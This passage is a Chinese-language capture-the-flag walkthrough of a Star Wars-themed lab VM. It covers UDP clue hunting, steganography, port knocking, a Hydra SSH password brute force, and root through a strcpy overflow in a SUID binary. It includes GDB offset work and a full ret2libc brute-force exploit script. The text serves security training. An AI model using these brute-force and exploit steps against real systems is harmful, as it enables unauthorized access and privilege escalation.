\u7aef\u53e3\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nc -ulnp 160 -vv\nlistening on [any] 160 ...\nconnect to [192.168.205.206] from (UNKNOWN) [192.168.205.210] 44380\n\nThanks to the successful Operation Skyhook, the Rebel Alliance\ngot some plans for the new weapon of the Galactic Empire. We\nknow that there is a small opening that we can explore through a\nthermal exhaust that is directly connected to the Main Reactor of the\nDeath Star. The superlaser takes 1440 minutes to reload.\nIt is very important to observe 'this window' in order to recover the blueprint.\nThis is because, it is only possible to make an attempt every 60 seconds.\n^C sent 0, rcvd 472\n\n# \u7ffb\u8bd1\n\u5f97\u76ca\u4e8e\u201c\u5929\u94a9\u884c\u52a8\u201d\u7684\u6210\u529f\uff0c\u4e49\u519b\u540c\u76df\n\u83b7\u5f97\u4e86\u4e00\u4e9b\u94f6\u6cb3\u5e1d\u56fd\u65b0\u6b66\u5668\u7684\u56fe\u7eb8\u3002\u6211\u4eec\n\u77e5\u9053\u6709\u4e00\u4e2a\u5c0f\u5f00\u53e3\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e2a\u70ed\u6392\u6c14\u53e3\u8fdb\u884c\u63a2\u7d22\uff0c\u8fd9\u4e2a\u6392\u6c14\u53e3\u76f4\u63a5\u8fde\u63a5\u5230\u6b7b\u661f\u7684\u4e3b\u53cd\u5e94\u5806\u3002\u8d85\u7ea7\u6fc0\u5149\u5668\u9700\u89811440\u5206\u949f\u624d\u80fd\u91cd\u65b0\u88c5\u586b\u3002\n\u4e3a\u4e86\u83b7\u53d6\u84dd\u56fe\uff0c\u89c2\u5bdf\u201c\u8fd9\u4e2a\u7a97\u53e3\u201d\u81f3\u5173\u91cd\u8981\u3002\n\u8fd9\u662f\u56e0\u4e3a\uff0c\u6bcf60\u79d2\u53ea\u80fd\u5c1d\u8bd5\u4e00\u6b21\u3002\n```\n\n\u76d1\u542c UDP 357 \u7aef\u53e3\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nc -ulnp 357 -vv\n[sudo] password for kali: \nlistening on [any] 357 ...\nconnect to [192.168.205.206] from (UNKNOWN) [192.168.205.210] 45629\n\n\nCode to access the Death Star Blueprint\nwithin the time it takes to reload is:  DS-1@OBS     \n\n^C sent 0, rcvd 97\n                   \n# \u7ffb\u8bd1\n\u5728\u91cd\u65b0\u52a0\u8f7d\u6240\u9700\u7684\u65f6\u95f4\u5185\u8bbf\u95ee\u6b7b\u661f\u84dd\u56fe\u7684\u4ee3\u7801\u662f\uff1aDS-1@OBS\n```\n\n\u4ece UDP 160 \u7aef\u53e3\u7684\u4fe1\u606f\u4e2d\u63d0\u53d6\u5230\u6570\u5b57 `1440` \u548c `60`\u3002\u4ece UDP 357 \u7aef\u53e3\u7684\u4fe1\u606f\u4e2d\u83b7\u53d6\u5230\u8bbf\u95ee\u4ee3\u7801 `DS-1@OBS`\u3002\n\u63d0\u793a\u8981\u89c2\u5bdf\u4e00\u4e2a '\u7a97\u53e3'\uff0c\u7ed3\u5408\u6570\u5b57\uff0c\u731c\u6d4b\u8fd9\u53ef\u80fd\u662f\u7aef\u53e3\u53f7\u3002\n\n\u5c1d\u8bd5\u626b\u63cf\u8fd9\u4e9b\u6570\u5b57\u5bf9\u5e94\u7684 UDP \u7aef\u53e3\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -sU -p1440,24,60 192.168.205.210\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 03:39 EDT\nNmap scan report for 192.168.205.210\nHost is up (0.00041s latency).\n\nPORT     STATE  SERVICE\n24/udp   closed priv-mail\n60/udp   closed unknown\n1440/udp open   eicon-slp\nMAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 0.30 seconds\n```\n\nUDP 1440 \u7aef\u53e3\u5f00\u653e\u3002\n\n### 3. \u83b7\u53d6\u56fe\u7247\u4e0e\u4fe1\u606f\u63d0\u53d6\n\n\u5411 UDP 1440 \u7aef\u53e3\u53d1\u9001\u4e4b\u524d\u83b7\u53d6\u7684\u4ee3\u7801 `DS-1@OBS`\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ echo 'DS-1@OBS' | sudo nc -u 192.168.205.210 1440 > 1440.txt\n```\n\n\u67e5\u770b\u63a5\u6536\u5230\u7684\u5185\u5bb9\uff0c\u53d1\u73b0\u662f Base64 \u7f16\u7801\u7684\u6570\u636e\uff0c\u5f00\u5934\u4e3a `/9j/4AAQSkZJRg`\uff0c\u8fd9\u662f JPEG \u6587\u4ef6\u7684\u5178\u578b\u7279\u5f81\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat 1440.txt | base64 -d > 1440.jpg\n```\n\n(\u6ce8: \u5b9e\u9645\u64cd\u4f5c\u4e2d\u5e94\u786e\u4fdd\u6570\u636e\u5b8c\u6574\u63a5\u6536\uff0c\u82e5\u56fe\u7247\u4e0d\u5b8c\u6574\u53ef\u80fd\u5bfc\u81f4\u540e\u7eed\u6b65\u9aa4\u5931\u8d25\u3002\u53ef\u4ee5\u4f7f\u7528 `nc -u -w1` \u8bbe\u7f6e\u8d85\u65f6\u3002)\n\n\u6253\u5f00\u56fe\u7247 `1440.jpg`\uff1a\n![image-20250515154643417](https://7r1umphk.github.io/image/20250515154722764.webp)\n\u56fe\u7247\u4e0a\u663e\u793a\u89e3\u9501\u4ee3\u7801\uff1a**197719801983**\u3002\n\n\u5c1d\u8bd5\u5bf9\u56fe\u7247\u8fdb\u884c\u9690\u5199\u5206\u6790\u3002`strings` \u548c `binwalk` \u672a\u53d1\u73b0\u660e\u663e\u7ebf\u7d22\u3002\u4f7f\u7528 `steghide`\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ steghide extract -sf 1440.jpg\nEnter passphrase: DS-1@OBS\nwrote extracted data to 'openTheExhaust.txt'.\n                 \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ cat openTheExhaust.txt       \nEach segment of the 'unlock code' can only contain 3 characters sent in sequence to unlock port 10110.\n                   \n# \u7ffb\u8bd1\n\u201c\u89e3\u9501\u7801\u201d\u6bcf\u6bb5\u53ea\u80fd\u5305\u542b3\u4e2a\u5b57\u7b26\uff0c\u6309\u987a\u5e8f\u53d1\u9001\u5373\u53ef\u89e3\u950110110\u7aef\u53e3\u3002\n```\n\n\u4f7f\u7528\u4e4b\u524d\u83b7\u53d6\u7684 `DS-1@OBS` \u4f5c\u4e3a\u5bc6\u7801\uff0c\u6210\u529f\u63d0\u53d6\u51fa `openTheExhaust.txt` \u6587\u4ef6\u3002\u5185\u5bb9\u63d0\u793a\u89e3\u9501\u4ee3\u7801\u6bcf\u6bb53\u4e2a\u5b57\u7b26\uff0c\u7528\u4e8e\u89e3\u9501 10110 \u7aef\u53e3\u3002\n\n### 4. \u7aef\u53e3\u6572\u95e8\u4e0e SSH \u767b\u5f55\n\n\u6839\u636e\u63d0\u793a\uff0c\u5c06\u89e3\u9501\u4ee3\u7801 `197719801983` \u5206\u5272\u6210 `197`, `719`, `801`, `983`\uff0c\u5e76\u8fdb\u884c\u7aef\u53e3\u6572\u95e8\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ knock 192.168.205.210 197 719 801 983\n```\n\n\u6572\u95e8\u540e\uff0c\u626b\u63cf\u76ee\u6807\u7aef\u53e3 10110\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nmap -p10110 -sT -sU 192.168.205.210 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 04:31 EDT\nNmap scan report for 192.168.205.210\nHost is up (0.00035s latency).\n\nPORT      STATE  SERVICE\n10110/tcp open   nmea-0183\n10110/udp closed nmea-0183\nMAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 0.35 seconds\n```\n\nTCP 10110 \u7aef\u53e3\u5df2\u5f00\u653e\u3002\u63a2\u6d4b\u670d\u52a1\u7248\u672c\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ nmap -p10110 -sV 192.168.205.210    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 04:32 EDT\nNmap scan report for 192.168.205.210\nHost is up (0.00033s latency).\n\nPORT      STATE SERVICE VERSION\n10110/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)\nMAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 0.47 seconds\n```\n\n\u7aef\u53e3 10110 \u8fd0\u884c\u7684\u662f OpenSSH 6.6.1p1\u3002\u5c1d\u8bd5 SSH \u767b\u5f55\uff0c\u6b64\u65f6\u6211\u4eec\u6ca1\u6709\u4efb\u4f55\u51ed\u636e\uff0c\u5148\u7528 root \u8bd5\u8bd5\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ssh root@192.168.205.210 -p 10110\nThe authenticity of host '[192.168.205.210]:10110 ([192.168.205.210]:10110)' can't be established.\nECDSA key fingerprint is SHA256:oXn/1IjNjNv4INght0MV2FrWXVvTB4QNM9Bx1aRRLos.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '[192.168.205.210]:10110' (ECDSA) to the list of known hosts.\n\n# ... ASCII Art ...\n                                                                          \nDevoloped by Galen Walton Erso\nSystem's user: erso\nPass Hint: My wife's first name plus the year (BBY) she died.\n\nGlory to the Empire - Project DS-1: Orbital Battle Station\n\n\nroot@192.168.205.210's password: \n```\n\nSSH \u767b\u5f55\u63d0\u793a\uff1a\n\n*   \u7528\u6237\u540d: `erso`\n*   \u5bc6\u7801\u63d0\u793a: '\u6211\u59bb\u5b50\u7684\u540d\u5b57\u52a0\u4e0a\u5979\u53bb\u4e16\u7684\u5e74\u4efd (BBY)\u3002' (My wife's first name plus the year (BBY) she died.)\n\n\u6839\u636e\u661f\u7403\u5927\u6218\u80cc\u666f\uff0cGalen Erso \u7684\u59bb\u5b50\u662f Lyra Erso\u3002\n![image-20250515163544826](https://7r1umphk.github.io/image/20250515163545042.webp)\n\n\u5979\u53bb\u4e16\u7684\u5e74\u4efd\u662f 13 BBY (Before Battle of Yavin)\u3002\n![image-20250515163625883](https://7r1umphk.github.io/image/20250515163626074.webp)\n\n\u6784\u9020\u53ef\u80fd\u7684\u5bc6\u7801\u5217\u8868\uff1a\n\n```\nLyra13\nlyra13\nLyraErso13\nlyraerso13\nLyraerso13\nlyraErso13\nLyra13BBY\nlyra13BBY\nLyra13bby\nlyra13bby\nLyra-13\nlyra-13\nLyra_13\nlyra_13\nLyra\nlyra\nErso\n```\n\n\u4f7f\u7528 Hydra \u8fdb\u884c\u7206\u7834\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ hydra -l erso -P pass ssh://192.168.205.210 -s 10110 -I -u -f -e nsr -t 64    \n\\Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-15 04:46:21\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 20 tasks per 1 server, overall 20 tasks, 20 login tries (l:1/p:20), ~1 try per task\n[DATA] attacking ssh://192.168.205.210:10110/\n[10110][ssh] host: 192.168.205.210   login: erso   password: lyra13\n[STATUS] attack finished for 192.168.205.210 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-15 04:46:22\n```\n\n\u6210\u529f\u7206\u7834\u51fa\u5bc6\u7801\u4e3a `lyra13`\u3002\n\u767b\u5f55 SSH\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ ssh erso@192.168.205.210 -p 10110\n# ... (Login banner) ...\nerso@deathStar1:~$ id\nuid=1000(erso) gid=1000(erso) groups=1000(erso)\n```\n\n\u6210\u529f\u767b\u5f55\u7528\u6237 `erso`\u3002\n\n### 5. \u63d0\u6743\n\n\u67e5\u770b `sudo` \u6743\u9650\u548c\u5bb6\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff1a\n\n```bash\nerso@deathStar1:~$ sudo -l\nsudo: unable to resolve host deathStar1\n[sudo] password for erso: \nSorry, user erso may not run sudo on deathStar1.\nerso@deathStar1:~$ ls -al\ntotal 28\ndrwxr-xr-x 3 erso erso 4096 May  3  2020 .\ndrwxr-xr-x 3 root root 4096 May  3  2020 ..\nlrwxrwxrwx 1 root root    9 May  3  2020 .bash_history -> /dev/null\n-rw-r--r-- 1 erso erso  220 May  3  2020 .bash_logout\n-rw-r--r-- 1 erso erso 3631 May  3  2020 .bashrc\ndrwx------ 2 erso erso 4096 May  3  2020 .cache\n-rw-r--r-- 1 erso erso  690 May  3  2020 .profile\n-rw------- 1 erso erso  369 May  3  2020 warning.txt\nerso@deathStar1:~$ cat warning.txt \nMessage from GALEN ERSO:\nThis is your chance. Destroy the plans of the Galactic Empire. I know that Lord Vader will not like this at all. But, this will be my chance for redemption. I hope you have enough knowledge to help destroy this new weapon.\nExplore the system and get 'root access' to read the secret message located at '/root/message.txt'. \nHack or fail!!\n```\n\n\u63d0\u793a root flag \u5728 `/root/message.txt`\u3002\n\n\u67e5\u627e SUID \u6587\u4ef6\uff1a\n\n```bash\nerso@deathStar1:~$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/gpasswd\n/usr/bin/traceroute6.iputils\n/usr/bin/at\n/usr/bin/newgrp\n/usr/bin/sudo\n/usr/bin/mtr\n/usr/bin/pkexec\n/usr/bin/passwd\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/pt_chown\n/usr/lib/openssh/ssh-keysign\n/usr/sbin/uuidd\n/usr/sbin/pppd\n/bin/su\n/bin/ping6\n/bin/fusermount\n/bin/dartVader  <-- \u53ef\u7591\n/bin/umount\n/bin/mount\n/bin/ping\n```\n\n`/bin/dartVader` \u662f\u4e00\u4e2a\u53ef\u7591\u7684 SUID \u6587\u4ef6\uff0c\u4e0e\u9776\u673a\u4e3b\u9898\u76f8\u5173\u3002\n\n\u5206\u6790 `/bin/dartVader`\uff1a\n\n```bash\nerso@deathStar1:~$ ls -l /bin/dartVader\n-rwsr-xr-x 1 root root 7338 Nov  7  2019 /bin/dartVader\nerso@deathStar1:~$ file /bin/dartVader\n/bin/dartVader: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=affd50502e973bd3d6d0637028395d87ba695ab9, not stripped\nerso@deathStar1:~$ /bin/dartVader\ndartVader: Voce tem um futuro aqui. Nao seja um Lammer, busque e aprenda realmente...\n# \u7ffb\u8bd1: \u8fbe\u65af\u00b7\u7ef4\u8fbe\uff1a\u4f60\u62e5\u6709\u672a\u6765\u3002\u522b\u505a\u62c9\u9ed8\uff0c\u53bb\u63a2\u7d22\u5e76\u771f\u6b63\u5b66\u4e60\u2026\u2026\n```\n\n\u8fd9\u662f\u4e00\u4e2a 32 \u4f4d SUID \u53ef\u6267\u884c\u6587\u4ef6\u3002\u67e5\u770b\u5176\u5b57\u7b26\u4e32\uff1a\n\n```bash\nerso@deathStar1:~$ strings /bin/dartVader\n# ... (\u90e8\u5206\u8f93\u51fa) ...\nstrcpy\n# ...\ngame3.c\n# ...\n```\n\n\u53d1\u73b0 `strcpy` \u51fd\u6570\u548c\u6e90\u6587\u4ef6\u540d `game3.c`\uff0c\u8fd9\u5f3a\u70c8\u6697\u793a\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u3002\n\n\u6d4b\u8bd5\u7f13\u51b2\u533a\u6ea2\u51fa\uff1a\n\n```bash\nerso@deathStar1:~$ /bin/dartVader aaaaaaaaa\nerso@deathStar1:~$ /bin/dartVader aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nerso@deathStar1:~$ /bin/dartVader aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nSegmentation fault (core dumped)\n```\n\n\u8f93\u5165\u5927\u91cf 'a' \u5bfc\u81f4\u6bb5\u9519\u8bef\uff0c\u786e\u8ba4\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u3002\n\n\u5c06 `/bin/dartVader` \u6587\u4ef6\u4f20\u8f93\u5230\u672c\u5730 Kali \u8fdb\u884c\u5206\u6790\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ scp -P 10110 erso@192.168.205.210:/bin/dartVader .\n# ... (\u4f20\u8f93\u6210\u529f) ...\n```\n\n\u4f7f\u7528 IDA Pro \u53cd\u7f16\u8bd1 `dartVader`\uff1a\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char dest[64]; // [esp+10h] [ebp-40h] BYREF\n\n  if ( argc == 1 )\n    errx(1, 'Voce tem um futuro aqui. Nao seja um Lammer, busque e aprenda realmente...\\n');\n  return (int)strcpy(dest, argv[1]);\n}\n```\n\n`dest` \u7f13\u51b2\u533a\u5927\u5c0f\u4e3a 64 \u5b57\u8282\u3002`strcpy` \u5c06 `argv[1]` (\u547d\u4ee4\u884c\u7b2c\u4e00\u4e2a\u53c2\u6570) \u590d\u5236\u5230 `dest`\uff0c\u6ca1\u6709\u957f\u5ea6\u68c0\u67e5\u3002\n\n\u5728 GDB \u4e2d\u786e\u5b9a EIP \u8986\u76d6\u7684\u7cbe\u786e\u504f\u79fb\u91cf\uff1a\n\n1.  \u751f\u6210\u4e00\u4e2a\u552f\u4e00\u7684\u975e\u91cd\u590d\u5b57\u7b26\u4e32\u4f5c\u4e3a\u8f93\u5165\u3002\n2.  \u5728 GDB \u4e2d\u8fd0\u884c\u7a0b\u5e8f\uff0c\u4f7f\u7528\u8be5\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\u3002\n3.  \u5f53\u7a0b\u5e8f\u5d29\u6e83\u65f6\uff0c\u67e5\u770b EIP \u5bc4\u5b58\u5668\u7684\u503c\u3002\n4.  \u4f7f\u7528 `pattern_offset.rb` (\u6216\u7c7b\u4f3c\u5de5\u5177) \u627e\u5230\u8be5\u503c\u5728\u539f\u59cb\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ gdb dartVader\n(gdb) set disassembly-flavor intel\n(gdb) run $(/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 80) \n# \u6216\u8005\u624b\u52a8\u8f93\u5165 pattern_create \u751f\u6210\u7684\u5b57\u7b26\u4e32\uff0c\u5982 Aa0Aa1...\nStarting program: /mnt/hgfs/gx/dartVader Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library '/lib/x86_64-linux-gnu/libthread_db.so.1'.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x63413563 in ?? ()\n(gdb) info registers eip\neip            0x63413563          0x63413563\n```\n\nEIP \u88ab `0x63413563` (ASCII 'c5Ac') \u8986\u76d6\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563 -l 80\n[*] Exact match at offset 76\n```\n\n\u504f\u79fb\u91cf\u4e3a 76 \u5b57\u8282\u3002\u9a8c\u8bc1\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ gdb dartVader\n(gdb) run $(python2 -c 'print 'A'*76 + 'BBBB'')\nStarting program: /mnt/hgfs/gx/dartVader $(python2 -c 'print 'A'*76 + 'BBBB'')\nProgram received signal SIGSEGV, Segmentation fault.\n0x42424242 in ?? ()\n(gdb) info registers eip\neip            0x42424242          0x42424242\n```\n\nEIP \u6210\u529f\u88ab `BBBB` (0x42424242) \u8986\u76d6\u3002\n\n\u68c0\u67e5\u7cfb\u7edf\u4fdd\u62a4\u673a\u5236\uff1a\n\n* ASLR (\u5730\u5740\u7a7a\u95f4\u5e03\u5c40\u968f\u673a\u5316):\n\n  ```bash\n  erso@deathStar1:~$ cat /proc/sys/kernel/randomize_va_space\n  2\n  ```\n\n  ASLR \u5b8c\u5168\u5f00\u542f\u3002\n\n* NX (No-eXecute bit):\n\n  ```bash\n  erso@deathStar1:~$ readelf -W -l /bin/dartVader \n  # ...\n  Program Headers:\n    Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align\n  # ...\n    GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10 \n  # ...\n  ```\n\n  `GNU_STACK` \u6807\u5fd7\u4e3a `RW`\uff0c\u8868\u793a\u6808\u533a\u53ef\u8bfb\u53ef\u5199\u4f46\u4e0d\u53ef\u6267\u884c\uff0cNX bit \u5f00\u542f\u3002\n\n\u7531\u4e8e ASLR \u548c NX \u5f00\u542f\uff0c\u76f4\u63a5\u6ce8\u5165 shellcode \u5230\u6808\u4e0a\u6267\u884c\u4e0d\u53ef\u884c\u3002\u91c7\u7528 Ret2Libc (\u8fd4\u56de\u5230 libc) \u6280\u672f\u3002\n\u7531\u4e8e\u662f 32 \u4f4d\u7cfb\u7edf\uff0clibc \u5730\u5740\u867d\u7136\u968f\u673a\u5316\uff0c\u4f46\u8303\u56f4\u76f8\u5bf9\u8f83\u5c0f\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u7206\u7834 libc \u57fa\u5740\u3002\n\n\u83b7\u53d6 libc \u4e2d `system`\u3001`exit` \u51fd\u6570\u548c `'/bin/sh'` \u5b57\u7b26\u4e32\u7684\u504f\u79fb\u91cf\uff1a\n\n```bash\nerso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' system@'\n  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0\n# system_offset = 0x00040310\n\nerso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' exit@'\n   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0\n# exit_offset = 0x00033260\n\nerso@deathStar1:~$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'\n 162d4c /bin/sh\n# sh_offset = 0x162d4c\n```\n\n\u591a\u6b21\u8fd0\u884c `ldd /bin/dartVader` \u89c2\u5bdf libc \u57fa\u5740\u53d8\u5316\u8303\u56f4\uff0c\u4f8b\u5982\uff1a\n\n```bash\nerso@deathStar1:~$ ldd /bin/dartVader \n        linux-gate.so.1 =>  (0xb7793000)\n        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75d7000) # <--- libc \u57fa\u5740\n        /lib/ld-linux.so.2 (0xb7795000)\n```\n\n\u57fa\u5740\u5927\u7ea6\u5728 `0xb75xxxxx` \u5230 `0xb77xxxxx` \u4e4b\u95f4\u3002\n\n\u7f16\u5199\u7206\u7834\u811a\u672c `exp.py`\uff1a\n\n```python\n#!/usr/bin/env python3\n\nfrom struct import pack\nfrom subprocess import call\n\n# \u5df2\u77e5\u504f\u79fb\u91cf\nsystem_offset = 0x40310\nexit_offset = 0x33260\nsh_offset = 0x162d4c\n\n# \u56fa\u5b9a\u76ee\u6807\u7a0b\u5e8f\u8def\u5f84\napp = b'/bin/dartVader'\n\n# \u7f13\u51b2\u533a\u586b\u5145\u957f\u5ea6\uff08\u6839\u636e\u4f60\u7684\u6ea2\u51fa\u70b9\u8c03\u6574\uff09\noffset = b'A' * 76\n\ndef try_exploit(libc_base):\n    system = pack('<I', libc_base + system_offset)\n    exit_func = pack('<I', libc_base + exit_offset)\n    sh_str = pack('<I', libc_base + sh_offset)\n    payload = offset + system + exit_func + sh_str\n    ret = call([app, payload])\n    return ret == 0\n\n# \u7206\u7834 libc \u5730\u5740\u8303\u56f4\uff08\u6bcf\u6b21\u589e\u52a0 0x1000\uff09\nbase_address = 0xb7500000\nend_address = 0xb7700000\n\nprint('[*] Starting brute-force attack...')\n\nfound = False\nfor addr in range(base_address, end_address, 0x1000):\n    print('[+] Trying libc base: 0x%08x' % addr)\n    if try_exploit(addr):\n        print('[+] Exploit successful!')\n        found = True\n        break\n\nif not found:\n    print('[-] Brute-force failed.')\n```\n\n\u5728\u9776\u673a\u4e0a\u8fd0\u884c\u6b64\u811a\u672c\uff08\u6216\u7c7b\u4f3c\u903b\u8f91\u7684\u811a\u672c\uff09\u3002\u5728\u7206\u7834\u8fc7\u7a0b\u4e2d\uff0c\u5f53 libc \u57fa\u5740\u6b63\u786e\u65f6\uff0c`system('/bin/sh')` \u4f1a\u88ab\u8c03\u7528\uff0c\u4ece\u800c\u83b7\u5f97 root shell\u3002\n\u7528\u6237\u5728 `0xb7564000` \u8fd9\u4e2a\u57fa\u5740\u9644\u8fd1\uff08\u6216\u5c31\u662f\u8fd9\u4e2a\u57fa\u5740\uff09\u83b7\u5f97\u4e86\u6210\u529f\u3002\n\n```bash\nerso@deathStar1:~$ python3 exp.py \n# ... (\u7206\u7834\u8fc7\u7a0b) ...\n[+] Trying libc base: 0xb7564000 \n# (\u6b64\u5904\u811a\u672c\u53ef\u80fd\u56e0 system('/bin/sh') \u8c03\u7528\u800c\u6682\u505c\uff0c\u6216\u8005shell\u76f4\u63a5\u63a5\u7ba1\u4e86\u7ec8\u7aef)\n# id\nuid=1000(erso) gid=1000(erso) euid=0(root) groups=0(root),1000(erso)\n# cat /root/message.txt\nArt by Shanaka Dias\n                    .==.\n                   ()''()-.\n        .---.       ;--; /\n      .'_:___'. _..'.  __'.\n      |__ --==|'-''' \\'...;\n      [  ]  :[|       |---\\\n      |__| I=[|     .'    '.\n      / / ____|     :       '._\n     |-/.____.'      | :       :\nsnd /___\\ /___\\      '-'._----'\n\n-------------------------------------\n\nCongratulations!!\nYou helped me destroy the empire's weapon.\n\n-------------------------------------\nIf you had fun, love to get your feedback.\nSend me a tweet @mrhenrike  ;)\n\nUntil the next VM and 'May the force be with you'.\n```\n\n### \u603b\u7ed3\n\n\u8be5\u9776\u673a\u6d89\u53ca\u4e86\u591a\u79cd\u6e17\u900f\u6280\u5de7\uff1a\n\n1.  \u901a\u8fc7\u6d41\u91cf\u6355\u83b7\u53d1\u73b0\u9690\u85cf\u7684 UDP \u901a\u4fe1\u7aef\u53e3\u3002\n2.  \u89e3\u6790 UDP \u6d88\u606f\u83b7\u53d6\u7ebf\u7d22\u548c\u5bc6\u7801\u3002\n3.  Base64 \u89e3\u7801\u548c\u56fe\u7247\u9690\u5199\uff08steghide\uff09\u83b7\u53d6\u8fdb\u4e00\u6b65\u6307\u4ee4\u3002\n4.  \u7aef\u53e3\u6572\u95e8\u6280\u672f\u89e3\u9501\u65b0\u7684\u670d\u52a1\u7aef\u53e3\u3002\n5.  SSH \u5f31\u5bc6\u7801\u7206\u7834\uff08\u57fa\u4e8e\u63d0\u793a\u4fe1\u606f\uff09\u3002\n6.  Linux SUID \u4e8c\u8fdb\u5236\u6587\u4ef6\u63d0\u6743\uff0c\u901a\u8fc7\u7f13\u51b2\u533a\u6ea2\u51fa\uff08strcpy\uff09\u548c Ret2Libc \u6280\u672f\u7ed5\u8fc7 ASLR \u548c NX \u4fdd\u62a4\uff0c\u6700\u7ec8\u83b7\u5f97 root \u6743\u9650\u3002\n\n\u6574\u4e2a\u8fc7\u7a0b\u5bf9\u4fe1\u606f\u6536\u96c6\u3001\u7ebf\u7d22\u5173\u8054\u548c\u6f0f\u6d1e\u5229\u7528\u80fd\u529b\u90fd\u6709\u4e00\u5b9a\u7684\u8003\u9a8c\u3002sentence", "top": 0, "createdAt": 1751016541, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script 